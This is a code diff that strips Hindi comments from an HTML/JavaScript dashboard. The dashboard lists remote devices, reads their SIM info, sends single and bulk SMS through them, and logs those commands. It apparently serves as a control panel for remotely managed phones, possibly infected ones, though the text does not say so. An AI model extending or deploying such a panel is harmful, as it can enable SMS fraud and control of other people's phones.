@@ -34,7 +34,6 @@
     .grid-item:nth-child(5) { background: linear-gradient(145deg, #11998e, #38ef7d); }
     .grid-item i { font-size:2rem; margin-bottom:5px; color:white; }
 
-    /* डिवाइस कार्ड – थोड़े मोटे */
     .device-grid { display:flex; flex-direction:column; gap:8px; margin:16px 0 25px; }
     .device-card { padding:12px 16px; border-radius:35px; display:flex; align-items:center; justify-content:space-between; cursor:pointer; border:2px solid white; box-shadow:0 5px 0 rgba(0,0,0,0.2); }
     .device-card:nth-child(6n+1) { background: linear-gradient(145deg, #ff0844, #ffb199); }
@@ -149,7 +148,6 @@
       startClock();
     }
 
-    // ---------- डायलॉग ----------
     function showDialog(message, type = 'success') {
       const old = document.getElementById('custom-dialog');
       if (old) old.remove();
@@ -176,7 +174,6 @@
       setTimeout(() => { if (document.getElementById('custom-dialog')) overlay.remove(); }, 3000);
     }
 
-    // ---------- लॉगिन ----------
     document.getElementById('login-btn').addEventListener('click', function() {
       const user = document.getElementById('login-id').value;
       const pass = document.getElementById('login-pass').value;
@@ -191,13 +188,11 @@
       }
     });
 
-    // ---------- डिवाइस लोड करो और नए डिवाइस सबसे ऊपर ----------
     async function loadDevices() {
       try {
         const res = await fetch(API_BASE + '/api/devices');
         if (!res.ok) throw new Error('Network response was not ok');
         devices = await res.json();
-        // नए डिवाइस सबसे ऊपर (lastSeen के आधार पर घटते क्रम)
         devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
         renderDeviceList();
       } catch (e) {
@@ -205,7 +200,6 @@
       }
     }
 
-    // 30 रंगों की लिस्ट
     function getDeviceColor(index) {
       const colors = [
         '#FFB6C1','#FFC0CB','#FF69B4','#FF1493','#FFA07A','#FF7F50','#FF6347','#FF4500',
@@ -235,7 +229,6 @@
       });
     }
 
-    // ---------- मेन्यू ग्रिड ----------
     document.getElementById('menu-btn').addEventListener('click', function(e) {
       e.stopPropagation();
       document.getElementById('dropdown-grid').classList.toggle('hidden');
@@ -279,20 +272,16 @@
         const res = await fetch(API_BASE + '/api/command-sms');
         if (!res.ok) throw new Error('HTTP error ' + res.status);
         const commands = await res.json();
-        
         let html = '<div class="full-screen"><div style="background:black;color:white;padding:16px;border-radius:40px;margin-bottom:16px;"><h3><i class="fas fa-history"></i> Command SMS Log</h3></div><div style="background:white; border-radius:30px; padding:16px; border:2px solid black; max-height:70vh; overflow-y:auto;">';
-        
         if (commands.length === 0) {
           html += '<p style="text-align:center;">No commands found</p>';
         } else {
           commands.forEach(cmd => {
             let data = { number: 'N/A', text: 'N/A' };
             try { data = JSON.parse(cmd.data); } catch (e) {}
-            
             let statusClass = cmd.status === 'sent' ? '#d4edda' : (cmd.status === 'failed' ? '#f8d7da' : '#fff3cd');
             const time = new Date(cmd.created_at).toLocaleString();
             const execTime = cmd.executed_at ? new Date(cmd.executed_at).toLocaleString() : '—';
-            
             html += '<div style="background:' + statusClass + '; padding:15px; margin-bottom:12px; border-radius:20px; border-left:6px solid ' + (cmd.status === 'sent' ? '#28a745' : (cmd.status === 'failed' ? '#dc3545' : '#ffc107')) + ';">' +
               '<div style="display:flex; justify-content:space-between;"><strong>📱 ' + data.number + '</strong><span>' + cmd.status.toUpperCase() + '</span></div>' +
               '<div>💬 ' + data.text + '</div>' +
@@ -341,7 +330,6 @@
       closeModal();
     });
 
-    // ---------- कलकत्ता घड़ी ----------
     function startClock() {
       function updateClock() {
         const now = new Date();
@@ -352,7 +340,6 @@
       setInterval(updateClock, 1000);
     }
 
-    // ---------- SIM info ----------
     async function loadSimInfo(deviceId) {
       try {
         const res = await fetch(API_BASE + '/api/sim-info?deviceId=' + deviceId);
@@ -401,10 +388,8 @@
         const text = document.getElementById('sms-text').value;
         if (!text) return showDialog('Type message', 'error');
         const deviceId = device.id;
-
         showDialog('Bulk SMS started in background. Check "Command SMS" for status.', 'success');
         closeFullScreen();
-
         setTimeout(() => {
           let sent = 0, failed = 0;
           (async () => {
@@ -515,11 +500,9 @@
       };
     }
 
-    // ---------- क्लोज ----------
     window.closeFullScreen = function() { document.getElementById('fullscreen-container').innerHTML = ''; };
     window.closeModal = function() { document.getElementById('modal-container').innerHTML = ''; };
 
-    // ---------- डिवाइस मोडल ----------
     function showDeviceModal(device) {
       const html = '<div class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-microchip"></i> ' + device.brand + ' ' + device.model + '</h3><button class="close-btn" onclick="closeModal()">✕</button></div><div class="option-grid">' +
         '<div class="option-item" data-opt="sms-send"><i class="fas fa-paper-plane"></i>Send SMS</div>' +
